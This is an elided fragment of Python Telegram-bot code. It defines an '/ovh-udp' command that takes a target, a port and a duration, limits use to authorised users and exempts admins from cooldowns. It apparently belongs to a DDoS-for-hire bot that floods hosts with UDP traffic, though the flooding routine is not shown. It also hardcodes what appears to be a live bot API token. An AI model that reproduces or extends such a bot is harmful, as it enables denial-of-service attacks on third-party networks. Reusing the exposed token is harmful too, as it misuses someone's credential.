...
bot = telebot.TeleBot('7815167165:AAG8jFfVWuH-Oxc1DjEWXH35RUtxqpdjc64')
...
# Handler for /kitty command
@bot.message_handler(commands=['ovh-udp'])
def handle_kitty(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            response = "Usage :- /ovh-udp <target> <port> <time>"  # Updated command syntax
    else:
        response = " You Are Not Authorized To Use This Command ."
